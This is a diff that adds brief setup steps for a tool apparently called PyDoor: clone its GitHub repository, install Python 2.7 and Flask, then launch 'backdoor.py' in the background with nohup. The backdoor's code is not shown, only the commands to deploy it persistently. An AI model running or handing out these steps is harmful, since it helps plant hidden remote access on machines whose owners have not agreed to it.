@@ -1,0 +1,8 @@
+Type these commands while in the root directory
+#1 git clone https://github.com/aidenmanansala/PyDoor.git
+#2 cd PyDoor
+#3 apt install python2.7
+#4 apt install python2.7-pip
+#5 pip install flask
+#6 pip install werkzeug
+#7 nohup python backdoor.py &
